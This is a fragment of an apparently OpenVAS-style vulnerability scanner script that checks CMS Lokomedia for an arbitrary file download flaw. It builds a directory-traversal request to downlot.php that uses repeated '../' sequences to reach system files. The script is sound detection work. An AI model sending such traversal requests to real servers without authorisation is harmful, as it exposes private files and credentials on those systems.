...
if(description)
{
  ...
  script_name("CMS Lokomedia Arbitrary File Download Vulnerability - Active Check");
  ...
  script_tag(name:"summary", value:"CMS Lokomedia is prone to a vulnerability that lets attackers
  ...
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/46915");
...
foreach dir( make_list_unique( "/lokomedia", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" )
    dir = "";

  res = http_get_cache( port:port, item:dir + "/downlot.php" );
  if( res !~ "HTTP/1\.[01] 200" )
    continue;

  foreach file( keys( files ) ) {

    url = dir + "/downlot.php?file=" + crap(data:"../", length:9 * 9 ) + files[file];
